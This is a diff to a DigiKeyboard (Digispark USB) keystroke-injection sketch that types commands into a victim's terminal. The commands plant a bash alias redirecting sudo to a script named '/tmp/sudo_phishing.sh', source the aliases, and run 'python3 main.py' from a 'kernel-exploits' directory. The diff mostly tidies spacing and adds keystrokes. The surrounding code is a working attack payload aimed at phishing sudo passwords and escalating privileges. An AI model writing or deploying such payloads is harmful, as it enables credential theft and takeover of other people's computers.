@@ -17,16 +17,15 @@ void setup() {
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.print("echo \"alias sudo='/tmp/sudo_phishing.sh'\" >> ~/.bash_aliases");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
-
     DigiKeyboard.print("source ~/.bash_aliases");
-
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.print(". ~/.bash_aliases");
-        DigiKeyboard.sendKeyStroke(KEY_ENTER);
-
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.print("cd ../kernel-exploits");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.print("python3 main.py");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.print("cd ../..");
     DigiKeyboard.sendKeyStroke(KEY_ENTER);
     DigiKeyboard.delay(500);
     
